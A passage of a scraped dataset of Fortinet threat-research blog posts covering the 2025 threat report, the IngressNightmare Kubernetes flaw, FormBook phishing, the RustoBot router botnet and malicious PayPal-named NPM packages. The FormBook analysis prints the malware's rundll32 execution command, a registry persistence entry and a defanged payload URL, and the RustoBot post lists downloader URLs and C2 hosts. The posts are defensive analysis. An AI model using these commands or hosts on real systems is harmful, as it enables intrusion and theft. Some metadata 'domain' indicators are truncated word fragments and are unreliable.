    "text": "FortiGuard Labs Threat Research In 2024, the FortiGuard Labs team observed a decisive shift in the threat landscape: Attackers are compressing the time between reconnaissance and compromise, and the window for defenders to respond is narrowing to days, sometimes hours. The2025 Global Threat Landscape Reportdraws on telemetry from Fortinet’s global sensor network and threat intelligence from FortiGuard Labs to deliver a clear message: the adversary advantage is accelerating. And unless organizations change how they measure and manage risk, the gap will continue to widen. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Across every stage of the attack chain, automation is reshaping threat behavior. In the reconnaissance phase, cybercriminals launched over 36,000 scans per second in 2024, a 16.7% global increase. These scans are no longer just searching for exposed ports; they’re probing deep into operational technology (OT), cloud APIs, and identity layers. SIP-based VoIP systems, RDP servers, and industrial protocols like Modbus TCP are being mapped automatically and continuously. Automation also extends to phishing, credential theft, and even malware development. Cyber adversaries use AI-powered tools like FraudGPT and ElevenLabs to craft convincing phishing lures, generate deepfake videos, and clone executive voices. Cybercriminals no longer need to write code or breach a system directly; threat actors can purchase access, tools, and infrastructure through a rapidly growing Cybercrime-as-a-Service (CaaS) marketplace. The result is an industrialized cybercrime economy that dramatically lowers the barrier to entry, expands the volume of attacks, and increases their success rate. In 2024, FortiGuard Labs tracked a 42% surge in stolen credentials offered on darknet forums. That’s more than 100 billion unique records—email addresses, passwords, session tokens, and multifactor bypass data—freely traded and sold. Infostealer malware like Redline and Vidar contributed to a 500% increase in credential log activity, much of it harvested in real time and sold by Initial Access Brokers (IABs) offering turnkey infiltration into corporate VPNs, RDPs, and admin panels. These credentials are the backbone of ransomware and espionage operations. Threat actors no longer just hunt for vulnerabilities to exploit; they’re buying entry into your network. And as long as stolen credentials remain abundant, brute force is unnecessary. Cloud services now sit at the center of modern operations, and identity has become one of the most critical security perimeters. Cloud breaches are no longer limited to misconfigured storage buckets. As infrastructure migrates to the cloud, attackers are finding familiar footholds to exploit, such as over-permissioned identities, credential leaks in public code repositories, and lateral movement through cloud-native services. FortiCNAPP telemetry shows that attackers often begin by logging in from unfamiliar geographies, sometimes within hours of a developer’s legitimate activity. From there, they escalate privileges, establish persistence, and use legitimate services to blend into normal network traffic. In 2024, 25% of all cloud incidents began with reconnaissance, such as API enumeration, permission probing, and discovery of exposed assets. Automation is also fueling scale. Fortinet’s intrusion prevention sensors recorded over 97 billion exploitation attempts in the second half of 2024, many targeting vulnerabilities disclosed years ago. CVE-2017-0147 (26.7% of all exploitation attempts), CVE-2021-44228 (11.6%), and CVE-2019-18935 (8%) remain among the most exploited—clear evidence that legacy exposures continue to create present-day risk. IoT devices were also a major target, accounting for over 20% of all exploits. Routers, surveillance cameras, and firewalls with outdated firmware or default credentials are being recruited into botnets, used for lateral movement, or exploited for persistent access. But what’s striking isn’t just the volume of exploitation. It’s how methodical it has become. Attackers aren’t wasting time. They map the exposed surfaces of potential victims, wait for a vulnerability to emerge, and either strike before the organization can apply a patch or sell that vulnerability information on darknet forums. Once inside, adversaries move with precision. In 88% of observed cases involving lateral movement, attackers used RDP to pivot within the network. Remote Access Trojans (RATs) such as Xeno RAT and SparkRAT provided remote command execution, data exfiltration, and long-term persistence. Living-off-the-land techniques using legitimate Windows tools and protocols have made traditional detection approaches less effective. Attackers routinely leveraged PowerShell, WMI, and SMB traffic anomalies to move laterally and escalate privileges. Active Directory manipulation (via DCSync and DCShadow) enabled attackers to harvest credentials and silently expand their access. Encrypted C2 channels, domain generation algorithms, and DNS tunneling were widely used to maintain communication with compromised systems, all while bypassing conventional perimeter defenses. The pattern is clear: Attackers are optimizing for speed, scale, and stealth. Defenders must do the same. Traditional security models that rely on static controls, point-in-time assessments, or delayed patch cycles are increasingly inadequate. What’s needed is a shift toward Continuous Threat Exposure Management (CTEM): This isn’t a technology conversation; it’s a business continuity conversation. Cyberthreats no longer wait for vulnerabilities to be exposed. Their reconnaissance efforts monitor all levels of the network, including compromised credentials and other weaknesses available on darknet forums, so they can strike before your team can respond. The global threat landscape is evolving, but the mission remains the same: reduce exposure, increase visibility, and move faster than the adversary. The Fortinet Security Fabric is designed to meet this challenge, uniting advanced threat intelligence, real-time detection, and coordinated response across the entire digital infrastructure. Executives must ensure their organizations are not only protected but positioned to adapt. Download the full2025 Global Threat Landscape Reportto gain deeper insights into these evolving threats and the strategies needed to counter them. FortiGuard Labs Threat Research Industry Trends Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/key-takeaways-from-the-2025-global-threat-landscape-report",
      "scraped_at": "2025-07-20T13:42:26.638110",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2021-44228",
          "CVE-2019-18935",
          "CVE-2017-0147"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.40728831725616294
    }
  },
  {
    "id": "Fortinet_79993",
    "source": "Fortinet",
    "title": "IngressNightmare: Understanding CVE‑2025‑1974 in Kubernetes Ingress-NGINX",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Ingress-NGINX Containers v1.11.0-4, v1.12.0, <v1.11.0Impacted Users:Any OrganizationImpact:Attackers gain control of the vulnerable systemsSeverity Level:Critical On March 24, 2025, researchers from Wiz, Inc. disclosed a critical group of vulnerabilities in the Kubernetes Ingress-NGINX controller, dubbedIngressNightmare. Among the most severe issues isCVE‑2025‑1974, which allows an attacker with only network access to the admission webhook to potentially achieve remote code execution (RCE) in the ingress controller pod. This vulnerability was privately disclosed earlier in March and publicly announced after patches became available. It has a CVSS rating of 9.8, underscoring the severity and urgency of applying the fixes. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. This article summarizes how these CVEs work, explains our proof-of-concept demo of the exploit, and outlines mitigations and detection strategies. We’ll also show how Lacework FortiCNAPP and the broader Fortinet Security Fabric provide coverage for these kinds of attacks. Key Point: In many configurations, the admission webhook is reachable from within the cluster’s network (i.e., from any pod). That means a compromised pod or a foothold within the cluster can exploit these annotation injection flawswithoutneeding Kubernetes API credentials. Our testing confirmed that this exploit path requires an attacker to reach the Ingress-NGINX admission controller on the cluster network. If you can only access the cluster via kubectl port-forward or other indirect means, some temporary file uploading steps may not work reliably. Hence, in practice, this RCE exploit is often executed from a pod that already has an internal vantage point on the cluster network (for example, a malicious container running due to SSRF, a misconfigured job, or a prior partial compromise). When chained, these vulnerabilities let an attacker: We’ve created a short video demonstration that showcases how the exploit works from start to finish, which you can watch here: Network Note: Our tests confirm that port forwarding doesn’t always replicate the network conditions needed to trigger the file upload mechanism. We recommend running the exploit from a pod already in the cluster’s network if you’re assessing your own environment. Because this vulnerability chain can yield near-complete cluster compromise, remediation should be a top priority. Key recommendations include: For a more detailed look at the patch details, see: Within our test environment, we leveragedLacework FortiCNAPPcomponents to gain multi-layered visibility into the compromise: In our demo, alerts were generated when we: Beyond Lacework FortiCNAPP’s container-aware protections, the broaderFortinet Security Fabricprovides additional layers of defense: For a summary of how Fortinet addresses this specific vulnerability and the associated set of CVEs, see theFortiGuard Threat Signal Reportpublished on April 3rd, 2025. IngressNightmare(CVE‑2025‑1974 and related flaws) highlights the importance of secure ingress configurations and strict controls on admission webhooks. By exploiting an internal vantage point, attackers can pivot from a low-privileged pod into a full cluster compromise if the ingress controller is left unpatched and overly exposed. Fortunately, patching and hardening are straightforward: Continuous visibility and detection go hand in hand with strong prevention. Tools likeLacework FortiCNAPPand theFortinet Security Fabricadd significant layers of protection for both container runtime security and the cloud control plane. Organizations can keep their Kubernetes clusters resilient against emerging threats like IngressNightmare by staying current on vulnerability disclosures and employing a defense-in-depth approach. Thank you for reading—and be sure to watch thedemo videofor an in-depth look at this exploit in action. Stay vigilant, and keep your clusters secure! FortiGuard Labs provides an IPS signature against attacks exploiting the following vulnerability: CVE-2025-1974: Kubernetes. Ingress. NGINX. Controller. Remote. Code. Execution If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Business and Technology Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ingressnightmare-understanding-cve-2025-1974-in-kubernetes-ingress-nginx",
      "scraped_at": "2025-07-20T13:42:34.678477",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2025-1974"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.39872408293460926
    }
  },
  {
    "id": "Fortinet_27599",
    "source": "Fortinet",
    "title": "Infostealer Malware FormBook Spread via Phishing Campaign – Part I",
    "text": "FortiGuard Labs Threat Research Fortinet’s FortiGuard Labs observed a phishing campaign in the wild that delivered a malicious Word document as an attachment. This document contained crafted data designed to exploit the vulnerabilityCVE-2017-11882. After conducting an in-depth analysis, I discovered that the campaign was spreading a new variant of Formbook. Formbook is information-stealing malware targeting Windows users. It steals sensitive data from compromised systems, including stored credentials from popular software, the victim’s keystrokes, screenshots, and system clipboard data. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. I will present my research into this malware in a series of analysis blogs. This first one provides insights into how the phishing email tricks the recipient into opening the attached Word document, how it exploits the vulnerability CVE-2017-11882 with crafted equation data, how it downloads and decrypts the fileless FormBook executable, and how it ultimately executes the FormBook malware in a selected target process via process hollowing. The phishing campaign starts with an email disguised as a sales order urging the recipient to open the attached Word document. As shown in Figure 1, FortiMail has flagged the email as “[virus detected]” in the Subject line to warn the recipient. The attached Word document, order0087.docx, is saved in OOXML (Office Open XML) format and compressed as a ZIP archive. Figure 2 reveals the relevant files and file contents inside the Word document. When the recipient opens the Word document, the “<w:altChunk>” node within document.xml is parsed, automatically loading an external file, “Algeria.rtf,” as shown in Figure 2. The RTF file (“Algeria.rtf”) is obfuscated with a large amount of junk data. After de-obfuscating the RTF file, two embedded binary objects (leading by “\\objdata” tag) can be found within it. The first binary object is a package containing a 64-bit DLL file, as shown in Figure 3. The DLL file, named “AdobeID.pdf,” is extracted to the system %temp% folder when the RTF is opened in Microsoft Word. The second binary object is in OLE format and contains crafted equation data intended for Microsoft Equation Editor 3.0. When Word parses the RTF file, this exploits the CVE-2017-11882 vulnerability. CVE-2017-11882is a known remote code execution (RCE) vulnerability in Microsoft Equation Editor (EQNEDT32. EXE). Parsing the crafted equation data in EQNEDT32. EXE causes a buffer overflow, and the return address of the vulnerable function is overwritten with 0x430C12, as seen in Figure 4. The instruction at 0x430C12 is “call ds:WinExec(),” which is called after the buffer overflow occurs and the vulnerable function returns to this address. Figure 5 shows a screenshot of EQNEDT32.exe calling this API at 0x430C12. The command-line parameter to WinExec() API is “CmD.exe /C rundll32 %tmp%\\AdobeID.pdf,IEX A”. This command is copied by the vulnerable function from the crafted equation data, as shown in Figure 4. As a result, the extracted 64-bit DLL file, AdobeID.pdf, is executed by rundll32.exe. Based on my analysis, the 64-bit DLL acts as a downloader and installer for Formbook. Let’s examine how it works. It adds a key into “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,” with the following settings: Key name: “RtkAudUService”Key value: “C:\\Windows\\System32\\rundll32.exe C:\\Users\\win-10\\AppData\\Roaming\\Templates\\AdobeID.pdf, IEX” This ensures the malicious command-line command executes automatically at the system’s startup. Figure 6 shows the added auto-run item in the system registry. Correspondingly, it: 1> Creates a folder named “Templates” under the %appdata% folder. 2> Copies the extracted 64-bit DLL into the new folder by executing the following command-line command: “cmd.exe /c copy C:\\Users\\%username%\\AppData\\Local\\Temp\\AdobeID.pdf C:\\Users\\%username%\\AppData\\Roaming\\Templates” The Formbook payload is disguised as a picture file (PNG) to be downloaded. The URL to the PNG file is: “hxxps://www2[.]0zz0[.]com/2025/02/02/10/709869215.png” To retrieve the payload, it uses multiple Windows API functions, including: WinHttpCrackUrl(),WinHttpOpen(),WinHttpConnect(),WinHttpOpenRequest(),WinHttpSendRequest(),WinHttpQueryOption(),WinHttpReceiveResponse(),WinHttpQueryDataAvailable()WinHttpReadData() I manually downloaded the PNG file to analyze it. Its size is 0x47000 (284KB). I then observed that its content is encrypted rather than a legitimate PNG (Figure 7). The malware then calls a function to decrypt the PNG file into the FormBook executable binary, as seen in Figure 8. The decrypted FormBook can be seen in the memory at the bottom. The decryption key is generated from a hardcoded string, “H1OX2WsqMLPKvGkQ.” To evade detection by endpoint security software, the FormBook payload executable is kept entirely in the memory. Since it does not write the decrypted Formbook to a local file to execute, this is a fileless variant of FormBook. This variant of FormBook chooses “C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe” as a target process to run the decrypted FormBook via process hollowing. The full path of the target process is hardcoded in the variant, which is passed to CreateProcessInternalW() API. In Figure 9 below, we see that the process is about to call the CreateProcessInternalW() API, whose second parameter (RDX holds) is a string of the full path of the target process. The sixth parameter ([rsp+30]) represents the CreationFlag. The value for the CreationFlag is 0x808040C, which is a combination of the following flags: CREATE_SUSPENDEDDETACHED_PROCESSCREATE_UNICODE_ENVIRONMENTCREATE_NO_WINDOW This ultimately creates a suspended “ImagingDevices.exe” process. The malware employs sophisticated process injection techniques: It creates a temporary and invisible file by calling two APIs: GetTempFileNameW()NtCreateFile() It then calls NtWriteFile() to write the decrypted FormBook executable into the invisible temporary file. Next, it calls NtCreateSection() API to create a memory section object from the temporary file, whose file handle is passed to the API. It then maps the section object into the target process (ImagingDevices.exe) by calling the Windows native API NtMapViewOfSection(). It also returns the address of the mapped FormBook inside the target process. At that point, the decrypted FormBook has been copied into the target process. Next, it calls the Wow64GetThreadContext() API to retrieve the thread context (the CPU register value/state) of the suspended target process. It then modifies the value of some registers so the target process points to the mapped FormBook. The corresponding API, Wow64SetThreadContext(), is then called to apply the modified registers to the target process. Figure 11 shows the WOW64_CONTEXT data in memory. It only modifies two register values, EAX to 0x6E1550 and EBX to 0x2D0D0. Why does it only modify those two registers rather than EIP? The selective modification of only EAX and EBX becomes clear when examining the target process's suspended state. The process has been intercepted at the execution of RtlUserThreadStart(), where EAX holds the thread function address and EBX contains the parameter to be passed to this thread function. Now, the value of EAX holds the entry point of FormBook inside the target process, where FormBook’s base address is 0x6E0000. It finally calls the Windows native API, NtResumeThread(), to resume the target process, and the RtlUserThreadStart() API is invoked to run the FormBook payload in a newly created thread. In this first part of the blog series on the FormBook malware, I presented the entire process, from the phishing email to how the FormBook payload is downloaded, decrypted, and deployed in a targeted process. To start, I presented the phishing email we discovered that was designed to trick recipients into opening a fake sales order attachment. Once the attached Word document is opened on the targeted device, it extracts a 64-bit DLL file, disguised as \"AdobeID.pdf,” into the system’s temporary folder. At the same time, it exploits the CVE-2017-11882 vulnerability in Microsoft Equation Editor 3.0 to execute the extracted DLL. The DLL file is launched via rundll32.exe, establishing persistence on the victim’s system by adding an auto-run item to the system registry. Additionally, it downloads and decrypts the FormBook executable file. I then provided a detailed explanation of how the decrypted FormBook payload is deployed in a target process (C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe) through process hollowing, as well as the Windows-native APIs it calls to accomplish this task. InPart IIof this series, I will present the anti-analysis techniques used in this variant of FormBook and how FormBook leverages the Heaven’s Gate technique to prevent analysis and detection. I’ll also cover how it collects sensitive data from the compromised device, its communications with its command and control (C2) server, and the specific C&C commands it uses to control the victim’s system. Stay tuned. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The FortiGuard’s Anti-Botnet Service has blocked the DNS requests for downloading the FormBook variant. The relevant URL downloading the PNG file is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard IPS service detects the vulnerability exploit against CVE-2017-11882 with the signature “MS. Office. EQNEDT32. EXE. Equation. Parsing. Memory. Corruption”. FortiGuard Antivirus service detects the malicious Word document, the embedded RTF file, the extracted 64-bit Dll file as well as the decrypted FormBook with the following AV signatures. MSWord/Formbook.9184!trRTF/CVE_2017_11882. FB!exploitW64/Formbook. RT!trW32/Formbook. AA!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://www2[.]0zz0[.]com/2025/02/02/10/709869215.png [order0087.docx]93CF566C0997D5DCD1129384420E4CE59764BD86FDABAAA8B74CAF5318BA9184 [Algeria.rtf]7C66E3156BBE88EC56294CD2CA15416DD2B18432DEEDC024116EA8FBB226D23B [AdobeID.pdf]2E73B32D2180FD06F5142F68E741DA1CFF1C5E96387CEBD489AD78DE18840A56 [Decrypted FormBook from PNG file]6AC778712DFFCE48B51850AC34A846DA357BE07328B00D0B629EC9B2F1C37ECE infostealer FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/infostealer-malware-formbook-spread-via-phishing-campaign-part-i",
      "scraped_at": "2025-07-20T13:42:43.961793",
      "indicators": {
        "ip_address": [],
        "domain": [
          "rder0087",
          "QNEDT32",
          "09869215",
          "mD",
          "dobeID",
          "md",
          "undll32",
          "magingDevices",
          "ocument",
          "lgeria"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "93CF566C0997D5DCD1129384420E4CE59764BD86FDABAAA8B74CAF5318BA9184",
          "7C66E3156BBE88EC56294CD2CA15416DD2B18432DEEDC024116EA8FBB226D23B",
          "2E73B32D2180FD06F5142F68E741DA1CFF1C5E96387CEBD489AD78DE18840A56",
          "6AC778712DFFCE48B51850AC34A846DA357BE07328B00D0B629EC9B2F1C37ECE"
        ],
        "cve": [
          "CVE-2017-11882"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.40272614622057
    }
  },
  {
    "id": "Fortinet_86417",
    "source": "Fortinet",
    "title": "New Rust Botnet \"RustoBot\" is Routed via Routers",
    "text": "FortiGuard Labs Threat Research Affected Platforms:TOTOLINK N600R V4.3.0cu.7570_B20200620. TOTOLINK A830R V5.9c.4729_B20191112, A3100R V4.1.2cu.5050_B20200504, A950RG V4.1.2cu.5161_B20200903, A800R V4.1.2cu.5137_B20200730, A3000RU V5.9c.5185_B20201128, and A810R V4.1.2cu.5182_B20201026. DrayTek Vigor2960 and Vigor300B 1.5.1.4. Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High FortiGuard Labs recently discovered a new botnet propagating through TOTOLINK devices. Unlike previous malware targeting these devices, this variant is written inRust—a programming language introduced by Mozilla in 2010. Due to its Rust-based implementation, we’ve named the malware“RustoBot.” 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. In January and February of 2025, FortiGuard Labs observed a significant increase in alerts related to attacking via TOTOLINK vulnerabilities. TOTOLINK vulnerabilities often stem from thecstecgi.cgifile—a CGI script responsible for processing user inputs, configuration changes, authentication, and administrative commands. These scripts have repeatedly been found to contain flaws, most notably command injection vulnerabilities that can be exploited remotely. Attackers can leverage various functions within this script to achieve remote code execution, includingsetUpgradeFW(CVE-2022-26210) andpingCheck(CVE-2022-26187). When we analyzed the payload athxxp://66[.]63[.]187[.]69/mpsl, we identified another vulnerability—CVE-2024-12987—affecting DrayTek devices, which was exploited by attackers during the same period. This vulnerability is an OS command injection located in thecgi-bin/mainfunction.cgi/apmcfguploadinterface. These exploits occurred in four countries: Japan, Taiwan, Vietnam, and Mexico. All incidents were aimed at technology industries. In this section, our analysis of “RustoBot” focuses on the x86 architecture version. Attackers distribute this malware using four different downloader scripts and employ two distinct commands—wgetandtftp—to retrieve and install “RustoBot.” According to the downloader scripts, “RustoBot” targets five different architectures:arm5,arm6,arm7,mips, andmpsl. However, we also identified an additional x86 architecture variant hosted on the same server. Most of the observed incident payloads specifically target TOTOLINK devices using thempslarchitecture, as illustrated in Figure 2. The malware can be identified from its plaintext string written in Rust. Its entry point can be found after analyzing the second layer of the “start” function. “RustoBot” retrieves the offsets of system API functions from the Global Offset Table (GOT) and invokes them to carry out specific behaviors. It encodes its configuration via the XOR encryption algorithm and uses numerous calculations to achieve obfuscation. First, “RustoBot” sets constants into registers for the following steps. It then makes use of instructions like “xor,” “shr,” and, “rol” to get the decoder key’s offset. Lastly, XOR decodes the hard-coded cipher with the key obtained from the former offset. Once the configuration value is decoded, it is used as an argument for subsequent functions defined in the decoded configuration. “RustoBot” exhibits two primary malicious behaviors: the first is resolving the C2 server’s domain, and the second is launching a DDoS attack. It first sends an initial packet to retrieve IP address data—specifically, the victim host’s public IP address—which is returned by the attacker’s server. It uses DNS-over-HTTPS (DoH) to blend malicious traffic into normal HTTPS requests, helping it hide within large volumes of legitimate web traffic. The retrieved IP address is then used as the value of the header field “S,” which we surmise stands for “Source.” “RustoBot” attempts to resolve four domains:dvrhelper[.]anondns[.]net,techsupport[.]anondns[.]net,rustbot[.]anondns[.]net, andmiraisucks[.]anondns[.]net. All of these domains resolve to the same IP address:5[.]255[.]125[.]150. The botnet subsequently establishes a connection with5[.]255[.]125[.]150and receives a set of parameters that serve as commands to trigger a DDoS attack: It can launch DDoS attacks using three different protocols:Raw IP,TCP, andUDP. IoT and network devices are often poorly defended endpoints, making them attractive targets for attackers to exploit and deliver malicious programs. Strengthening endpoint monitoring and authentication can significantly reduce the risk of exploitation and help mitigate malware campaigns. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/Mirai. AEH!tr.dldrELF/Mirai. CZX!trELF/Mirai. DCD!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides IPS signature against attacks exploiting the following vulnerabilities: CVE-2022-26186: TOTOLINK. Devices.cstecgi. Command. InjectionCVE-2022-26187: TOTOLINK. Devices.cstecgi. Command. InjectionCVE-2022-26188: TOTOLINK. Devices.cstecgi. Command. InjectionCVE-2022-26189: TOTOLINK. Devices.cstecgi. Command. InjectionCVE-2022-26210: TOTOLINK. Devices.cstecgi. Command. InjectionCVE-2024-12987: DrayTek. Routers.apmcfgupload. Command. Injection We also suggest that organizations go through Fortinet’s free training module:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://66[.]63[.]187[.]69/w.shhxxp://66[.]63[.]187[.]69/wget.shhxxp://66[.]63[.]187[.]69/thxxp://66[.]63[.]187[.]69/tftp.shhxxp://66[.]63[.]187[.]69/arm5hxxp://66[.]63[.]187[.]69/arm6hxxp://66[.]63[.]187[.]69/arm7hxxp://66[.]63[.]187[.]69/mipshxxp://66[.]63[.]187[.]69/mpslhxxp://66[.]63[.]187[.]69/x86 dvrhelper[.]anondns[.]nettechsupport[.]anondns[.]netrustbot[.]anondns[.]netmiraisucks[.]anondns[.]net5[.]255[.]125[.]150 76a487a46cfeb94eb5a6290ceffabb923c35befe71a1a3b7b7d67341a40bc45475d031e8faaf3aa0e9cafd5ef0fd7de1a2a80aaa245a9e92bae6433a17f48385fbdd5cba193a5e097cd12694efe14a15eb0fc059623f82da6c0bf99cbcfa22f80dde88e9e5a0670e19c3b3e864de1b6319aaf92989739602e55b494b09873fbe 15c9d7a63fa419305d7f2710b63f71cc38178973c0ccf6d437ce8b6feeca4ee1427399864232c6c099f183704b23bff241c7e0de642e9eec66cc56890e8a63044f0ba25183ecb79a0721037a0ff9452fa8c19448f82943deca01b36555f2cc99c0abb19b3a72bd2785e8b567e82300423da672a463eefdeda6dd60872ff0e072dae8dae748be54ba0d5785ab27b1fdf42b7e66c48ab19177d4981bcc032cfb1c9f098920613bd0390d6485936256a67ae310b633124cfbf503936904e69a81bfe547306d6dee4b5b2b6ce3e989b9713a5c21ebe3fefa0f5c1a1ea37cec37e20fb910e77ee686d7d6769fab8cb8f9b17a4609c4e164bb4ed80d9717d9ddad364f44a526f20c592fd95b4f7d61974c6f87701e33776b68a5d0b44ccd2fa3f48c5defb0153047b08aa1876e1e4e97a082f6cb05af75479e1e9069b77d98473a11f49a9b5bdeb1f23736ceffba623c8950d627a791a0b40c4d44ae2f80e02a43955d5dc90cbb0f69f283ccf52a2a79b3dfe94ee8b3474cf6474cfcbe9f66f245a55db68e2d852ad157fc01da34e11aa24a5ab30845b706d7827b8119a3e648ce2cf19e660ce74e1bdb0a75293758200b03efd5f807e7896665addb684e0ffb53afd2ec9e77f1185f644462305184cf8afcf5d12c7eb524a2d3f4090a658a198c20ce114b460012412411363c9a3ab0246e48a584ce86fc6c0b7855495ec531dd05a11697fd5230f7f09a7b43fee1a1693013ed98beeb7a182cd3f0393d93dd1b7576 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/new-rust-botnet-rustobot-is-routed-via-routers",
      "scraped_at": "2025-07-20T13:42:52.430894",
      "indicators": {
        "ip_address": [
          "1.5.1.4"
        ],
        "domain": [
          "",
          "ftp",
          "hecstecgi",
          "get",
          "evices",
          "r",
          "ainfunction",
          "outers"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2022-26188",
          "CVE-2022-26189",
          "CVE-2024-12987",
          "CVE-2022-26186",
          "CVE-2022-26187",
          "CVE-2022-26210"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.7891491985203455
    }
  },
  {
    "id": "Fortinet_4126",
    "source": "Fortinet",
    "title": "Malicious NPM Packages Targeting PayPal Users",
    "text": "FortiGuard Labs Threat Research FortiGuard Labs’ AI-driven OSS malware detection system has recently discovered a series of malicious NPM packages designed to steal sensitive information from compromised systems. These packages are believed to have been created between March 5 and March 14 by a threat actor known astommyboy_h1andtommyboy_h2to targetPayPalusers. PayPal is a widely used platform holding sensitive financial information. Using PayPal-related names helps these malicious packages avoid detection, making it easier for attackers to steal sensitive information. By including \"PayPal\" in the name of the malicious packages, such asoauth2-paypalandbuttonfactoryserv-paypal, the attackers also create a false sense of legitimacy, tricking developers into installing them. The code collects and exfiltrates system data, such as usernames and directory paths, which can then be used to target PayPal accounts or be sold for fraudulent purposes. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The code has very similar characteristics, aiming to steal sensitive information and send it to remote servers. Users would lose their private info without knowing it. The preinstall hook runs a malicious script automatically before the package is installed, bypassing user or security tool detection. The script collects system data like the current user, working directory, and hostname, which helps the attacker understand the environment for further malicious actions. This information is then encoded into hexadecimal format and obfuscated by truncating and splitting directory paths to make it harder for security measures to detect. The obfuscated data is sent to an external server controlled by the attacker, with the dynamically generated URL making it more difficult to block. The sensitive data exfiltrated may be used in further attacks. The hacker published numerous malicious packages in a short time. These attacks function by using a \"preinstall hook\" in malicious NPM packages, automatically running a script when the package is installed. This script collects system information, like the user, hostname, and directory paths, and then sends it to an attacker-controlled server. To spot a compromise, look for unusual NPM packages with names like \"paypal\" (e.g., oauth2-paypal or buttonfactoryserv-paypal). Other signs include unexpected network connections to unknown servers, so also check your network logs for any suspicious activity. If you find any suspicious packages, remove them, change compromised credentials, and scan your system for further threats. Make sure your security software is up to date to detect such issues. The authors oftommyboy_h1andtommyboy_h2are likely the same person, publishing multiple malicious packages in a short time. We suspect that the same author created these packages to targetPayPalusers. We urge the public to be cautious when downloading packages and to ensure they are from trusted sources to avoid falling victim to such attacks. FortiGuard AntiVirusdetects the malicious files identified in this report as: bankingbundleserv_1.20.0: Bash/TommyBoy. A!trbuttonfactoryserv-paypal_3.50.0: Bash/TommyBoy. A!trbuttonfactoryserv-paypal_3.99.0:Bash/TommyBoy. A!trtommyboytesting_1.0.1:Bash/TommyBoy. A!trtommyboytesting_1.0.2:Bash/TommyBoy. A!trtommyboytesting_1.0.5:Bash/TommyBoy. A!trtommyboytesting_1.0.6:Bash/TommyBoy. A!trtommyboytesting_1.0.7:Bash/TommyBoy. A!trtommyboytesting_1.0.8:Bash/TommyBoy. A!trtommyboytesting_1.0.9:Bash/TommyBoy. A!trtommyboytesting_1.0.10:Bash/TommyBoy. A!trtommyboytesting_1.0.11:Bash/TommyBoy. A!trtommyboytesting_1.0.12:Bash/TommyBoy. A!trcompliancereadserv-paypal_2.1.0:Bash/TommyBoy. A!troauth2-paypal_0.6.0:Bash/TommyBoy. A!troauth2-paypal_1.6.0:Bash/TommyBoy. A!troauth2-paypal_2.6.0:Bash/TommyBoy. A!troauth2-paypal_4.8.0:Bash/TommyBoy. A!troauth2-paypal_7.5.0:Bash/TommyBoy. A!troauth2-paypal_10.0.0:Bash/TommyBoy. A!troauth2-paypal_699.0.0:Bash/TommyBoy. A!trPaymentapiplatformservice-paypal_1.20.0:Bash/TommyBoy. 